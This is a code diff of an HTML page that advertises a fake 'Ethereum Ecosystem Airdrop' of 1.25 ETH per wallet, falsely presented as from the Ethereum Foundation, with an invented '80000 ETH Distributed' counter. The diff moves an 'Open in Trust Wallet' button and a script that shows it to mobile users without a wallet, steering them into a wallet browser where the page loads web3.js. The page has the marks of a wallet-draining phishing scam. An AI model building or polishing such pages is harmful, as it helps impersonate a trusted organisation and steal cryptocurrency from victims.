@@ -68,28 +68,7 @@
             <h1>Claim Your <span class="eth-highlight">Ethereum</span><br>Ecosystem Airdrop</h1>
             <p class="hero-subtitle">Official distribution for early Ethereum adopters. 1.25 ETH allocation per eligible wallet.</p>
        
-        <div id="trust-wallet-btn-wrapper" style="display: none; margin: 12px 0;">
-  <button 
-    type="button" 
-    onclick="window.location.href='https://trustwallet.com' + encodeURIComponent(window.location.href);"
-    style="background-color: #0500FF; color: #FFFFFF; border: none; border-radius: 8px; padding: 12px 20px; font-size: 16px; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; font-family: sans-serif;"
-  >
-    <i class="fas fa-shield-alt"></i> Open in Trust Wallet
-  </button>
-</div>
-
-<script>
-  (function() {
-    // Only show this button if the user is on a mobile browser AND not already inside a dApp browser
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    const hasWallet = typeof window.ethereum !== 'undefined';
-    
-    if (isMobile && !hasWallet) {
-      document.getElementById('trust-wallet-btn-wrapper').style.display = 'block';
-    }
-  })();
-</script>
-        
+                
         
         
         </section>
@@ -232,16 +211,37 @@
             <div class="trust-stat"><div class="trust-stat-icon"><i class="fas fa-coins"></i></div><h4 class="counter-value" data-target="80000">0</h4><p>ETH Distributed</p></div>
         </div>
 
-        <footer class="eth-footer">
-            <div class="footer-copyright">© 2026 Ethereum Foundation. All rights reserved.</div>
-            <div class="footer-links">
-                <a href="#"><i class="fas fa-file-lines"></i> Terms</a>
-                <a href="#"><i class="fas fa-shield-halved"></i> Privacy</a>
-                <a href="#"><i class="fas fa-circle-question"></i> FAQ</a>
-                <a href="#"><i class="fas fa-book"></i> Docs</a>
-                <a href="#"><i class="fab fa-github"></i> GitHub</a>
-            </div>
-        </footer>
+       <footer class="eth-footer">
+    <div id="trust-wallet-btn-wrapper" style="display: none; margin-bottom: 14px; text-align: center;">
+        <button 
+            type="button" 
+            onclick="window.location.href='https://trustwallet.com' + encodeURIComponent(window.location.href);"
+            style="background-color: #0500FF; color: #FFFFFF; border: none; border-radius: 6px; padding: 8px 16px; font-size: 14px; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; font-family: inherit;"
+        >
+            <i class="fas fa-wallet"></i> Open in Trust Wallet
+        </button>
+    </div>
+
+    <div class="footer-copyright">© 2026 Ethereum Foundation. All rights reserved.</div>
+    <div class="footer-links">
+        <a href="#"><i class="fas fa-file-lines"></i> Terms</a>
+        <a href="#"><i class="fas fa-shield-halved"></i> Privacy</a>
+        <a href="#"><i class="fas fa-circle-question"></i> FAQ</a>
+        <a href="#"><i class="fas fa-book"></i> Docs</a>
+        <a href="#"><i class="fab fa-github"></i> GitHub</a>
+    </div>
+
+    <script>
+        (function() {
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            const hasWallet = typeof window.ethereum !== 'undefined';
+            
+            if (isMobile && !hasWallet) {
+                document.getElementById('trust-wallet-btn-wrapper').style.display = 'block';
+            }
+        })();
+    </script>
+</footer>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
